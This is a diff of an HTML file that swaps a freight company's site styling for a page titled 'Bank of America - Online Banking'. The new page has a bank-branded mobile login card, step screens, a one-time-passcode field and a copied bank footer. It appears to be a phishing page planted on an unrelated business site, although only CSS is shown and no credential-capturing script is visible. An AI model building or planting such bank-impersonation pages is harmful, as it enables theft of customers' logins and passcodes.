@@ -1,1245 +1,526 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-<meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-<title>Greenway Express | Global Freight & Cargo Logistics</title>
-<link rel="icon" type="image/svg+xml" href="https://greenwayexpressllc.com/wp-content/uploads/2022/05/logo.svg">
-<link rel="preconnect" href="https://fonts.googleapis.com">
-<link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;500;600;700;800&family=Inter:wght@300;400;500;600;700&display=swap" rel="stylesheet">
-<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css">
-<link rel="stylesheet" href="https://unpkg.com/leaflet@1.9.4/dist/leaflet.css"/>
+<meta charset="UTF-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no" />
+<title>Bank of America - Online Banking</title>
 <style>
-:root {
-  --primary: #006B3F;
-  --primary-light: #00B860;
-  --primary-dark: #004D2D;
-  --accent: #D4AF37;
-  --dark: #0A1F1C;
-  --dark-2: #0D2B25;
-  --light: #F0F7F4;
-  --white: #FFFFFF;
-  --text: #1A2F2C;
-  --text-muted: #5A7A73;
-  --border: #D0E5DC;
-  --shadow: 0 4px 24px rgba(0,107,63,0.08);
-  --shadow-lg: 0 12px 48px rgba(0,107,63,0.15);
-  --success: #00B860;
-  --warning: #F5C842;
-  --error: #EF4444;
-  --blue: #0066FF;
-}
-* { margin:0; padding:0; box-sizing:border-box; }
-html { scroll-behavior:smooth; overflow-x:hidden; }
-body { font-family:'Inter',sans-serif; color:var(--text); line-height:1.7; overflow-x:hidden; background:var(--white); }
-h1,h2,h3,h4,h5,h6 { font-family:'Poppins',sans-serif; }
-a { text-decoration:none; color:inherit; }
-img { max-width:100%; display:block; image-rendering:-webkit-optimize-contrast; }
-section { position:relative; }
+  * { margin: 0; padding: 0; box-sizing: border-box; -webkit-tap-highlight-color: transparent; }
+  body {
+    font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+    background-color: #f4f4f4;
+    display: flex;
+    justify-content: center;
+    align-items: flex-start; /* Changed to allow scrolling */
+    min-height: 100vh;
+  }
+  
+  /* Phone Screen Shape */
+  .phone-container {
+    width: 100%;
+    max-width: 420px;
+    background: #f4f4f4;
+    min-height: 100vh;
+    box-shadow: 0 0 20px rgba(0,0,0,0.1);
+    position: relative;
+    overflow-x: hidden;
+    display: flex;
+    flex-direction: column;
+  }
 
-/* SCROLL PROGRESS */
-.scroll-progress { position:fixed; top:0; left:0; height:3px; background:linear-gradient(90deg,var(--primary),var(--primary-light)); z-index:9998; width:0%; transition:width 0.1s; }
+  /* Header Logo */
+  .header {
+    padding: 30px 20px 30px;
+    text-align: center;
+    background: #fff;
+  }
+  .header img {
+    max-width: 220px;
+    height: auto;
+  }
 
-/* ===== PRELOADER WITH TRUCK ANIMATION ===== */
-.preloader { position:fixed; inset:0; background:var(--dark); z-index:99999; display:flex; align-items:center; justify-content:center; flex-direction:column; gap:20px; transition:opacity 0.5s, visibility 0.5s; }
-.preloader.hidden { opacity:0; pointer-events:none; visibility:hidden; }
-.preloader img { height:50px; filter:brightness(0) invert(1); animation:preloaderPulse 1.5s ease-in-out infinite; }
-@keyframes preloaderPulse { 0%,100%{opacity:1;} 50%{opacity:0.5;} }
-.preloader-text { color:rgba(255,255,255,0.7); font-size:13px; letter-spacing:2px; text-transform:uppercase; }
-/* Truck road */
-.preloader-road { position:absolute; bottom:50px; left:5%; right:5%; height:4px; background:linear-gradient(90deg,transparent,rgba(0,184,96,0.6),rgba(0,184,96,0.6),transparent); border-radius:4px; overflow:hidden; }
-.preloader-road::after { content:''; position:absolute; top:50%; left:0; right:0; height:2px; background:repeating-linear-gradient(90deg,rgba(255,255,255,0.5) 0,rgba(255,255,255,0.5) 12px,transparent 12px,transparent 24px); transform:translateY(-50%); animation:roadDash 0.4s linear infinite; }
-@keyframes roadDash { from{transform:translateY(-50%) translateX(0);} to{transform:translateY(-50%) translateX(24px);} }
-/* Moving truck */
-.preloader-truck { position:absolute; bottom:28px; left:-80px; font-size:44px; color:var(--primary-light); animation:truckMove 2.5s linear forwards; text-shadow:0 4px 16px rgba(0,184,96,0.6); }
-.preloader-truck i { display:block; }
-@keyframes truckMove { 0%{left:-80px;} 100%{left:calc(100% + 30px);} }
+  /* Content Area */
+  .content {
+    padding: 20px 20px 40px;
+    display: flex;
+    flex-direction: column;
+    flex: 1;
+  }
 
-/* NAVIGATION */
-.navbar { position:fixed; top:0; left:0; right:0; z-index:1000; padding:16px 0; transition:all 0.3s ease; }
-.navbar.scrolled { background:rgba(255,255,255,0.97); box-shadow:0 2px 20px rgba(0,0,0,0.08); padding:10px 0; backdrop-filter:blur(10px); }
-.nav-container { max-width:1280px; margin:0 auto; padding:0 24px; display:flex; align-items:center; justify-content:space-between; }
-.nav-logo img { height:40px; transition:all 0.3s; }
-.navbar.scrolled .nav-logo img { height:36px; }
-.nav-links { display:flex; list-style:none; gap:36px; align-items:center; }
-.nav-links a { color:rgba(255,255,255,0.9); font-size:14px; font-weight:500; transition:all 0.2s; position:relative; }
-.navbar.scrolled .nav-links a { color:var(--text); }
-.nav-links a::after { content:''; position:absolute; bottom:-4px; left:0; width:0; height:2px; background:var(--primary-light); transition:width 0.3s; }
-.nav-links a:hover::after { width:100%; }
-.nav-links a:hover { color:var(--primary-light); }
-.navbar.scrolled .nav-links a:hover { color:var(--primary); }
-.nav-track-btn { background:var(--primary-light); color:#fff; border:none; padding:10px 26px; border-radius:50px; font-size:13px; font-weight:600; cursor:pointer; transition:all 0.3s; }
-.nav-track-btn:hover { background:var(--primary); transform:translateY(-2px); box-shadow:0 8px 24px rgba(0,184,96,0.3); }
-.nav-toggle { display:none; background:none; border:none; color:#fff; font-size:24px; cursor:pointer; }
-.navbar.scrolled .nav-toggle { color:var(--text); }
+  /* Login Card Box */
+  .login-card {
+    border: 1px solid #e0e0e0;
+    border-radius: 4px;
+    overflow: hidden;
+    box-shadow: 0 2px 5px rgba(0,0,0,0.05);
+    background: #fff;
+    margin-bottom: 30px;
+  }
+  .top-line { display: flex; height: 4px; width: 100%; }
+  .line-red { background: #E31837; flex: 1; }
+  .line-blue { background: #012169; flex: 1; }
+  .card-content { padding: 25px 25px 30px; }
 
-/* HERO — BACKGROUND CHANGED TO GREEN TRUCK IMAGE */
-.hero { min-height:100vh; display:flex; align-items:center; justify-content:center; position:relative; overflow:hidden; background:linear-gradient(135deg,rgba(10,31,28,0.85),rgba(0,107,63,0.7)),url('https://media.istockphoto.com/id/2158864024/photo/green-electric-delivery-vans-with-connected-charging-cables.jpg?s=612x612&w=0&k=20&c=Es04HSM5uUgkY-Znu2DQ0g9FQ6KdMFKp0Nd4drSS3Gw=') center/cover no-repeat fixed; }
-.hero-content { text-align:center; color:#fff; max-width:800px; padding:100px 24px 60px; z-index:2; position:relative; }
-.hero-logo-bg { background:rgba(255,255,255,0.97); padding:14px 32px; border-radius:14px; display:inline-block; margin-bottom:28px; box-shadow:0 8px 32px rgba(0,0,0,0.2); }
-.hero-logo-bg img { height:46px; }
-.hero h1 { font-size:clamp(30px,5vw,52px); font-weight:700; line-height:1.25; margin-bottom:18px; color:#fff; }
-.hero h1 span { color:var(--primary-light); }
-.hero p { font-size:clamp(15px,2vw,18px); color:rgba(255,255,255,0.85); margin-bottom:36px; line-height:1.7; max-width:600px; margin-left:auto; margin-right:auto; }
-.tracking-box { background:#fff; border-radius:14px; padding:8px; display:flex; gap:0; max-width:560px; margin:0 auto; box-shadow:0 16px 48px rgba(0,0,0,0.25); }
-.tracking-box input { flex:1; border:none; padding:16px 22px; font-size:15px; outline:none; border-radius:10px 0 0 10px; font-family:inherit; color:var(--text); }
-.tracking-box input::placeholder { color:#999; }
-.track-btn { background:linear-gradient(135deg,var(--primary),var(--primary-light)); color:#fff; border:none; padding:0 36px; border-radius:0 10px 10px 0; font-size:14px; font-weight:600; cursor:pointer; transition:all 0.3s; display:flex; align-items:center; gap:8px; white-space:nowrap; }
-.track-btn:hover { background:linear-gradient(135deg,var(--primary-dark),var(--primary)); }
-.track-btn:disabled { opacity:0.6; cursor:not-allowed; }
-.track-error { color:rgba(255,255,255,0.85); font-size:13px; margin-top:12px; min-height:20px; }
-.scroll-indicator { position:absolute; bottom:30px; left:50%; transform:translateX(-50%); color:rgba(255,255,255,0.6); font-size:24px; animation:float 2s ease-in-out infinite; cursor:pointer; }
-@keyframes float { 0%,100%{transform:translateX(-50%) translateY(0);} 50%{transform:translateX(-50%) translateY(-12px);} }
+  /* Steps */
+  .step { display: none; flex-direction: column; }
+  .step.active { display: flex; }
 
-/* STATS BAR */
-.stats-bar { background:var(--dark); padding:50px 24px; }
-.stats-inner { max-width:1280px; margin:0 auto; display:grid; grid-template-columns:repeat(4,1fr); gap:30px; }
-.stat-item { text-align:center; }
-.stat-item i { font-size:28px; color:var(--primary-light); margin-bottom:10px; }
-.stat-num { font-size:clamp(28px,4vw,40px); font-weight:800; color:#fff; font-family:'Poppins',sans-serif; letter-spacing:-1px; }
-.stat-label { font-size:13px; color:rgba(255,255,255,0.6); font-weight:500; margin-top:4px; }
+  h2 {
+    font-size: 20px;
+    color: #333;
+    margin-bottom: 25px;
+    font-weight: 600;
+  }
+  
+  p.subtitle {
+    color: #666;
+    font-size: 14px;
+    margin-bottom: 20px;
+    line-height: 1.4;
+  }
 
-/* SECTION GENERAL */
-.section-pad { padding:90px 24px; }
-.section-inner { max-width:1280px; margin:0 auto; }
-.section-label { display:inline-flex; align-items:center; gap:8px; background:rgba(0,184,96,0.1); color:var(--primary); font-size:12px; font-weight:700; letter-spacing:1.5px; text-transform:uppercase; padding:6px 16px; border-radius:50px; margin-bottom:18px; }
-.section-label::before { content:''; width:6px; height:6px; border-radius:50%; background:var(--primary-light); }
-.section-title { font-size:clamp(26px,4vw,38px); font-weight:700; color:var(--dark); margin-bottom:16px; line-height:1.3; }
-.section-subtitle { font-size:16px; color:var(--text-muted); max-width:680px; margin-bottom:50px; line-height:1.7; }
+  /* Inputs */
+  .input-group {
+    margin-bottom: 20px;
+  }
+  .input-group label {
+    display: block;
+    font-size: 13px;
+    color: #666;
+    margin-bottom: 8px;
+    font-weight: 500;
+  }
+  .input-group input {
+    width: 100%;
+    padding: 12px 12px;
+    font-size: 16px;
+    border: 1px solid #012169; /* Dark Blue Border */
+    border-radius: 4px;
+    background: #fff;
+    outline: none;
+    transition: border-color 0.2s;
+  }
+  .input-group input:focus {
+    border-color: #E31837; /* Red on focus for BofA feel */
+    box-shadow: 0 0 3px rgba(227, 24, 55, 0.2);
+  }
 
-/* ABOUT */
-.about { background:var(--white); }
-.about-grid { display:grid; grid-template-columns:1fr 1fr; gap:50px; align-items:center; }
-.about-img-wrap { position:relative; border-radius:16px; overflow:hidden; box-shadow:var(--shadow-lg); }
-.about-img-wrap img { width:100%; height:480px; object-fit:cover; filter:contrast(1.05) saturate(1.1) brightness(1.03); }
-.about-img-overlay { position:absolute; inset:0; background:linear-gradient(135deg,rgba(0,107,63,0.3),transparent); }
-.about-experience { position:absolute; bottom:24px; left:24px; right:24px; background:rgba(255,255,255,0.97); border-radius:12px; padding:20px 24px; display:flex; align-items:center; gap:16px; }
-.about-experience .num { font-size:36px; font-weight:800; color:var(--primary); font-family:'Poppins'; }
-.about-experience .txt { font-size:13px; color:var(--text-muted); line-height:1.4; }
-.about-text h2 { margin-bottom:20px; }
-.about-text p { color:var(--text-muted); margin-bottom:18px; line-height:1.8; font-size:15px; }
-.about-features { display:grid; grid-template-columns:1fr 1fr; gap:16px; margin-top:28px; }
-.about-feature { display:flex; gap:12px; align-items:flex-start; }
-.about-feature i { width:40px; height:40px; min-width:40px; border-radius:10px; background:rgba(0,184,96,0.1); display:flex; align-items:center; justify-content:center; color:var(--primary); font-size:16px; }
-.about-feature h4 { font-size:14px; font-weight:600; color:var(--dark); margin-bottom:2px; }
-.about-feature p { font-size:12px; color:var(--text-muted); margin:0; }
+  /* Checkbox */
+  .checkbox-group {
+    display: flex;
+    align-items: center;
+    margin-bottom: 25px;
+    cursor: pointer;
+  }
+  .checkbox-group input {
+    width: 18px;
+    height: 18px;
+    margin-right: 10px;
+    cursor: pointer;
+    accent-color: #012169;
+  }
+  .checkbox-group label {
+    font-size: 14px;
+    color: #333;
+    cursor: pointer;
+  }
 
-/* SERVICES */
-.services { background:var(--light); }
-.services-grid { display:grid; grid-template-columns:repeat(3,1fr); gap:24px; }
-.service-card { background:#fff; border-radius:14px; padding:36px 28px; box-shadow:var(--shadow); border:1px solid var(--border); transition:all 0.4s; position:relative; overflow:hidden; }
-.service-card::before { content:''; position:absolute; top:0; left:0; right:0; height:4px; background:linear-gradient(90deg,var(--primary),var(--primary-light)); transform:scaleX(0); transform-origin:left; transition:transform 0.4s; }
-.service-card:hover::before { transform:scaleX(1); }
-.service-card:hover { transform:translateY(-8px); box-shadow:var(--shadow-lg); border-color:var(--primary-light); }
-.service-icon { width:64px; height:64px; border-radius:14px; background:linear-gradient(135deg,var(--primary),var(--primary-dark)); display:flex; align-items:center; justify-content:center; font-size:26px; color:#fff; margin-bottom:20px; }
-.service-card h3 { font-size:18px; font-weight:700; color:var(--dark); margin-bottom:10px; }
-.service-card p { font-size:14px; color:var(--text-muted); line-height:1.65; margin-bottom:16px; }
-.service-link { font-size:13px; font-weight:600; color:var(--primary); display:inline-flex; align-items:center; gap:6px; }
-.service-link:hover { gap:10px; transition:gap 0.2s; }
+  /* Buttons */
+  .btn-login {
+    width: 100%;
+    padding: 14px;
+    background-color: #012169;
+    color: #fff;
+    border: none;
+    border-radius: 8px; /* Curved edges */
+    font-size: 16px;
+    font-weight: 600;
+    cursor: pointer;
+    transition: background-color 0.2s, transform 0.1s;
+    margin-bottom: 25px;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    min-height: 48px;
+  }
+  .btn-login:hover { background-color: #001a4d; }
+  .btn-login:active { transform: scale(0.98); }
+  .btn-login:disabled { background-color: #012169; opacity: 0.7; cursor: not-allowed; }
 
-/* FLEET */
-.fleet { background:var(--white); }
-.fleet-grid { display:grid; grid-template-columns:repeat(3,1fr); gap:20px; }
-.fleet-card { position:relative; border-radius:14px; overflow:hidden; height:280px; cursor:pointer; box-shadow:var(--shadow); }
-.fleet-card img { width:100%; height:100%; object-fit:cover; filter:contrast(1.05) saturate(1.1) brightness(1.03); transition:transform 0.6s; }
-.fleet-card:hover img { transform:scale(1.08); }
-.fleet-overlay { position:absolute; inset:0; background:linear-gradient(to top,rgba(10,31,28,0.9) 0%,rgba(10,31,28,0.2) 60%,transparent 100%); display:flex; flex-direction:column; justify-content:flex-end; padding:24px; }
-.fleet-overlay h3 { color:#fff; font-size:18px; font-weight:700; margin-bottom:4px; }
-.fleet-overlay p { color:rgba(255,255,255,0.8); font-size:13px; }
-.fleet-tag { position:absolute; top:16px; left:16px; background:rgba(0,184,96,0.9); color:#fff; padding:4px 14px; border-radius:50px; font-size:11px; font-weight:600; }
+  /* Button Spinner */
+  .btn-spinner {
+    width: 20px;
+    height: 20px;
+    border: 3px solid rgba(255,255,255,0.3);
+    border-top: 3px solid #fff;
+    border-radius: 50%;
+    animation: spin 1s linear infinite;
+  }
 
-/* COVERAGE */
-.coverage { background:var(--dark); color:#fff; }
-.coverage .section-title { color:#fff; }
-.coverage .section-subtitle { color:rgba(255,255,255,0.7); }
-.coverage-grid { display:grid; grid-template-columns:1fr 1fr; gap:50px; align-items:center; }
-.coverage-stats { display:grid; grid-template-columns:1fr 1fr; gap:20px; }
-.coverage-stat { background:rgba(255,255,255,0.05); border:1px solid rgba(0,184,96,0.2); border-radius:12px; padding:24px; text-align:center; }
-.coverage-stat i { font-size:28px; color:var(--primary-light); margin-bottom:10px; }
-.coverage-stat .num { font-size:32px; font-weight:800; color:#fff; font-family:'Poppins'; }
-.coverage-stat .lbl { font-size:12px; color:rgba(255,255,255,0.6); margin-top:4px; }
-.coverage-map { position:relative; border-radius:16px; overflow:hidden; box-shadow:0 16px 48px rgba(0,0,0,0.3); }
-.coverage-map img { width:100%; height:auto; filter:contrast(1.05) saturate(1.1) brightness(1.03); }
+  /* Links */
+  .links {
+    display: flex;
+    flex-direction: column;
+    gap: 12px;
+    text-align: center;
+  }
+  .links a {
+    color: #0a3c8c;
+    text-decoration: none;
+    font-size: 13px;
+    font-weight: 500;
+  }
+  .links a:hover { text-decoration: underline; }
 
-/* WHY US */
-.why-us { background:var(--light); }
-.why-grid { display:grid; grid-template-columns:repeat(4,1fr); gap:24px; }
-.why-card { background:#fff; border-radius:14px; padding:32px 24px; text-align:center; box-shadow:var(--shadow); border-top:4px solid var(--primary-light); transition:all 0.3s; }
-.why-card:hover { transform:translateY(-6px); box-shadow:var(--shadow-lg); }
-.why-icon { width:60px; height:60px; margin:0 auto 18px; border-radius:50%; background:rgba(0,184,96,0.1); display:flex; align-items:center; justify-content:center; font-size:24px; color:var(--primary); }
-.why-card h3 { font-size:16px; font-weight:700; color:var(--dark); margin-bottom:8px; }
-.why-card p { font-size:13.5px; color:var(--text-muted); line-height:1.65; }
+  /* OTP Input */
+  .otp-input {
+    text-align: center;
+    letter-spacing: 8px;
+    font-size: 20px;
+  }
 
-/* PROCESS */
-.process { background:var(--white); }
-.process-steps { display:grid; grid-template-columns:repeat(4,1fr); gap:20px; position:relative; }
-.process-steps::before { content:''; position:absolute; top:40px; left:12%; right:12%; height:2px; background:linear-gradient(90deg,var(--primary),var(--primary-light)); z-index:0; }
-.process-step { text-align:center; position:relative; z-index:1; }
-.process-num { width:80px; height:80px; border-radius:50%; background:#fff; border:3px solid var(--primary-light); display:flex; align-items:center; justify-content:center; font-size:28px; font-weight:800; color:var(--primary); margin:0 auto 18px; box-shadow:0 8px 24px rgba(0,107,63,0.15); }
-.process-step h3 { font-size:16px; font-weight:700; color:var(--dark); margin-bottom:8px; }
-.process-step p { font-size:13px; color:var(--text-muted); max-width:180px; margin:0 auto; line-height:1.6; }
+  /* Loading / Error UI */
+  .loading-box {
+    display: flex;
+    flex-direction: column;
+    align-items: center;
+    justify-content: center;
+    flex: 1;
+    text-align: center;
+    padding: 60px 0;
+  }
+  .spinner {
+    width: 50px;
+    height: 50px;
+    border: 5px solid #f3f3f3;
+    border-top: 5px solid #012169;
+    border-radius: 50%;
+    animation: spin 1s linear infinite;
+    margin-bottom: 30px;
+  }
+  @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+  
+  .error-text {
+    color: #d62d20;
+    font-size: 16px;
+    font-weight: 500;
+    margin-top: 15px;
+    display: none;
+  }
 
-/* GALLERY */
-.gallery { background:var(--dark); }
-.gallery .section-title { color:#fff; }
-.gallery .section-subtitle { color:rgba(255,255,255,0.7); }
-.gallery-grid { display:grid; grid-template-columns:repeat(3,1fr); gap:16px; }
-.gallery-item { position:relative; border-radius:12px; overflow:hidden; height:240px; }
-.gallery-item img { width:100%; height:100%; object-fit:cover; filter:contrast(1.05) saturate(1.1) brightness(1.03); transition:transform 0.6s; }
-.gallery-item:hover img { transform:scale(1.1); }
-.gallery-overlay { position:absolute; inset:0; background:linear-gradient(to top,rgba(10,31,28,0.85),transparent 60%); display:flex; flex-direction:column; justify-content:flex-end; padding:20px; opacity:0; transition:opacity 0.3s; }
-.gallery-item:hover .gallery-overlay { opacity:1; }
-.gallery-overlay h4 { color:#fff; font-size:16px; font-weight:700; margin-bottom:4px; }
-.gallery-overlay p { color:rgba(255,255,255,0.8); font-size:12px; }
+  /* ==========================================
+     FOOTER (Visible on Scroll) 
+     ========================================== */
+  .bofa-footer {
+    background: #012169;
+    color: #fff;
+    padding: 40px 30px;
+    text-align: center;
+    font-size: 12px;
+    margin-top: auto;
+  }
+  .footer-links {
+    display: flex;
+    flex-wrap: wrap;
+    justify-content: center;
+    gap: 12px 18px;
+    margin-bottom: 30px;
+  }
+  .footer-links a {
+    color: #fff;
+    text-decoration: none;
+    font-weight: 500;
+  }
+  .footer-links a:hover { text-decoration: underline; color: #ccc; }
 
-/* TESTIMONIALS */
-.testimonials { background:var(--light); }
-.t-grid { display:grid; grid-template-columns:repeat(3,1fr); gap:24px; }
-.t-card { background:#fff; border-radius:14px; padding:32px 28px; box-shadow:var(--shadow); border:1px solid var(--border); }
-.t-stars { color:var(--accent); font-size:16px; margin-bottom:14px; letter-spacing:2px; }
-.t-card p { font-size:14px; color:var(--text-muted); line-height:1.7; margin-bottom:20px; font-style:italic; }
-.t-author { display:flex; align-items:center; gap:12px; }
-.t-avatar { width:44px; height:44px; border-radius:50%; background:linear-gradient(135deg,var(--primary),var(--primary-light)); display:flex; align-items:center; justify-content:center; color:#fff; font-weight:700; font-size:16px; }
-.t-author strong { font-size:14px; color:var(--dark); display:block; }
-.t-author span { font-size:12px; color:var(--text-muted); }
+  .social-section { margin-bottom: 30px; }
+  .social-section p { margin-bottom: 15px; font-size: 14px; font-weight: 600; }
+  
+  .social-icons {
+    display: flex;
+    justify-content: center;
+    gap: 20px;
+  }
+  .social-icons a {
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    color: #fff;
+    transition: transform 0.2s;
+  }
+  .social-icons a:hover { transform: translateY(-3px); color: #E31837; }
+  .social-icons svg { width: 24px; height: 24px; fill: currentColor; }
 
-/* QUOTE */
-.quote { background:linear-gradient(135deg,var(--primary),var(--primary-dark)); padding:80px 24px; }
-.quote-inner { max-width:900px; margin:0 auto; display:grid; grid-template-columns:1fr 1fr; gap:40px; align-items:center; }
-.quote-text h2 { color:#fff; font-size:clamp(24px,3vw,34px); margin-bottom:14px; }
-.quote-text p { color:rgba(255,255,255,0.85); font-size:15px; }
-.quote-form { background:#fff; border-radius:14px; padding:28px; }
-.quote-form h3 { font-size:18px; color:var(--dark); margin-bottom:18px; }
-.quote-form .form-row { display:grid; grid-template-columns:1fr 1fr; gap:12px; }
-.quote-form input, .quote-form select { width:100%; padding:12px 14px; border:1.5px solid var(--border); border-radius:8px; font-size:14px; outline:none; font-family:inherit; margin-bottom:12px; color:var(--text); background:#fff; }
-.quote-form input:focus, .quote-form select:focus { border-color:var(--primary-light); }
-.quote-form button { width:100%; padding:14px; background:var(--primary); color:#fff; border:none; border-radius:8px; font-size:15px; font-weight:600; cursor:pointer; transition:background 0.2s; }
-.quote-form button:hover { background:var(--primary-dark); }
+  .legal {
+    border-top: 1px solid rgba(255,255,255,0.2);
+    padding-top: 20px;
+    line-height: 1.6;
+  }
+  .legal a { color: #fff; text-decoration: underline; }
 
-/* FAQ */
-.faq-sec { background:var(--white); }
-.faq-list { max-width:780px; margin:0 auto; }
-.faq-item { border:1px solid var(--border); border-radius:12px; margin-bottom:12px; overflow:hidden; transition:all 0.2s; }
-.faq-item.open { border-color:var(--primary-light); box-shadow:0 4px 20px rgba(0,184,96,0.08); }
-.faq-q { padding:18px 24px; display:flex; justify-content:space-between; align-items:center; cursor:pointer; font-weight:600; font-size:15px; color:var(--dark); }
-.faq-q i { color:var(--primary); font-size:14px; transition:transform 0.3s; }
-.faq-item.open .faq-q i { transform:rotate(180deg); }
-.faq-a { display:none; padding:0 24px 20px; font-size:14px; color:var(--text-muted); line-height:1.7; }
-.faq-item.open .faq-a { display:block; }
-
-/* CONTACT */
-.contact { background:var(--light); }
-.contact-grid { display:grid; grid-template-columns:1fr 1fr; gap:50px; align-items:start; }
-.contact-info h2 { margin-bottom:16px; }
-.contact-info p { color:var(--text-muted); margin-bottom:28px; font-size:15px; }
-.contact-points { display:grid; gap:18px; }
-.contact-point { display:flex; gap:14px; align-items:flex-start; }
-.contact-point i { width:46px; height:46px; min-width:46px; border-radius:12px; background:linear-gradient(135deg,var(--primary),var(--primary-dark)); display:flex; align-items:center; justify-content:center; color:#fff; font-size:18px; }
-.contact-point h4 { font-size:14px; font-weight:600; color:var(--dark); margin-bottom:2px; }
-.contact-point p { font-size:13px; color:var(--text-muted); margin:0; }
-.contact-form { background:#fff; border-radius:14px; padding:32px; box-shadow:var(--shadow); border:1px solid var(--border); }
-.contact-form h3 { font-size:20px; color:var(--dark); margin-bottom:20px; }
-.contact-form input, .contact-form textarea { width:100%; padding:14px 16px; border:1.5px solid var(--border); border-radius:8px; font-size:14px; outline:none; font-family:inherit; margin-bottom:14px; color:var(--text); background:#fff; }
-.contact-form input:focus, .contact-form textarea:focus { border-color:var(--primary-light); box-shadow:0 0 0 3px rgba(0,184,96,0.1); }
-.contact-form textarea { resize:vertical; min-height:120px; }
-.contact-form button { width:100%; padding:15px; background:linear-gradient(135deg,var(--primary),var(--primary-light)); color:#fff; border:none; border-radius:8px; font-size:15px; font-weight:600; cursor:pointer; transition:all 0.3s; }
-.contact-form button:hover { transform:translateY(-2px); box-shadow:0 8px 24px rgba(0,107,63,0.3); }
-
-/* FOOTER */
-.footer { background:var(--dark); color:rgba(255,255,255,0.8); padding:70px 24px 30px; }
-.footer-inner { max-width:1280px; margin:0 auto; display:grid; grid-template-columns:2fr 1fr 1fr 1fr; gap:40px; }
-.footer-brand img { height:38px; filter:brightness(0) invert(1); margin-bottom:18px; }
-.footer-brand p { font-size:13.5px; line-height:1.7; margin-bottom:18px; color:rgba(255,255,255,0.6); }
-.footer-social { display:flex; gap:10px; }
-.footer-social a { width:38px; height:38px; border-radius:50%; background:rgba(255,255,255,0.08); display:flex; align-items:center; justify-content:center; color:#fff; font-size:14px; transition:all 0.2s; }
-.footer-social a:hover { background:var(--primary-light); }
-.footer-col h4 { color:#fff; font-size:13px; font-weight:700; text-transform:uppercase; letter-spacing:1px; margin-bottom:18px; }
-.footer-links { list-style:none; }
-.footer-links li { margin-bottom:10px; }
-.footer-links a { font-size:13.5px; color:rgba(255,255,255,0.6); transition:color 0.2s; }
-.footer-links a:hover { color:var(--primary-light); }
-.footer-hours { display:grid; gap:8px; }
-.footer-hours div { display:flex; justify-content:space-between; font-size:13px; color:rgba(255,255,255,0.6); }
-.footer-hours div span:last-child { color:var(--primary-light); font-weight:600; }
-.footer-bottom { max-width:1280px; margin:40px auto 0; padding-top:24px; border-top:1px solid rgba(255,255,255,0.08); display:flex; justify-content:space-between; align-items:center; flex-wrap:wrap; gap:12px; }
-.footer-bottom p { font-size:12px; color:rgba(255,255,255,0.5); }
-
-/* BACK TO TOP */
-.back-top { position:fixed; bottom:24px; right:24px; width:48px; height:48px; border-radius:50%; background:var(--primary); color:#fff; border:none; font-size:18px; cursor:pointer; z-index:900; opacity:0; pointer-events:none; transition:all 0.3s; box-shadow:0 8px 24px rgba(0,107,63,0.3); }
-.back-top.show { opacity:1; pointer-events:auto; }
-.back-top:hover { background:var(--primary-dark); transform:translateY(-3px); }
-
-/* TOAST */
-.toast { position:fixed; bottom:100px; left:50%; transform:translateX(-50%); background:var(--dark); color:#fff; padding:14px 28px; border-radius:50px; font-size:14px; font-weight:500; z-index:9999; opacity:0; pointer-events:none; transition:opacity 0.3s, transform 0.3s; box-shadow:0 8px 32px rgba(0,0,0,0.25); }
-.toast.show { opacity:1; transform:translateX(-50%) translateY(0); }
-
-/* ===== TRACKING MODAL — FULL SCREEN ON PHONE ===== */
-.track-modal { position:fixed; inset:0; background:rgba(10,31,28,0.88); z-index:5000; display:none; justify-content:center; align-items:flex-start; padding:20px; overflow-y:auto; backdrop-filter:blur(6px); }
-.track-modal.show { display:flex; }
-.track-modal-box { background:#fff; border-radius:16px; max-width:860px; width:100%; margin:auto; overflow:hidden; box-shadow:0 24px 80px rgba(0,0,0,0.3); }
-.track-modal-header { background:linear-gradient(135deg,var(--dark),var(--dark-2)); padding:24px 28px; display:flex; justify-content:space-between; align-items:center; position:sticky; top:0; z-index:10; }
-.track-modal-header img { height:30px; filter:brightness(0) invert(1); }
-.track-close { background:rgba(255,255,255,0.15); border:none; width:40px; height:40px; border-radius:50%; color:#fff; font-size:20px; cursor:pointer; transition:all 0.2s; display:flex; align-items:center; justify-content:center; }
-.track-close:hover { background:rgba(255,255,255,0.3); transform:rotate(90deg); }
-.track-modal-body { padding:28px; }
-.track-status-row { display:flex; justify-content:space-between; align-items:center; margin-bottom:24px; flex-wrap:wrap; gap:12px; }
-.track-num { font-size:15px; color:var(--text-muted); }
-.track-num strong { color:var(--dark); font-family:'Poppins'; font-size:18px; letter-spacing:1px; }
-.track-badge { background:rgba(245,200,66,0.15); color:#B8860B; padding:6px 18px; border-radius:50px; font-size:12px; font-weight:700; display:flex; align-items:center; gap:6px; }
-.track-badge .dot { width:8px; height:8px; border-radius:50%; background:#F5C842; animation:pulse 2s infinite; }
-@keyframes pulse { 0%,100%{opacity:1;} 50%{opacity:0.4;} }
-/* Progress Bar */
-.progress-wrap { margin-bottom:28px; }
-.progress-bar { height:8px; background:var(--border); border-radius:50px; overflow:hidden; position:relative; }
-.progress-fill { height:100%; width:45%; background:linear-gradient(90deg,var(--primary),var(--primary-light)); border-radius:50px; position:relative; }
-.progress-fill::after { content:''; position:absolute; inset:0; background:linear-gradient(90deg,transparent,rgba(255,255,255,0.4),transparent); animation:shimmer 2s infinite; }
-@keyframes shimmer { 0%{transform:translateX(-100%);} 100%{transform:translateX(100%);} }
-.progress-labels { display:flex; justify-content:space-between; margin-top:10px; font-size:11px; color:var(--text-muted); font-weight:600; }
-.progress-labels span.active { color:var(--primary); }
-/* Details Cards */
-.details-grid { display:grid; grid-template-columns:1fr 1fr; gap:16px; margin-bottom:24px; }
-.detail-card { background:var(--light); border-radius:12px; padding:20px; border:1px solid var(--border); }
-.detail-card h4 { font-size:12px; font-weight:700; color:var(--primary); text-transform:uppercase; letter-spacing:1px; margin-bottom:14px; display:flex; align-items:center; gap:8px; }
-.detail-row { display:flex; gap:8px; margin-bottom:8px; font-size:13px; }
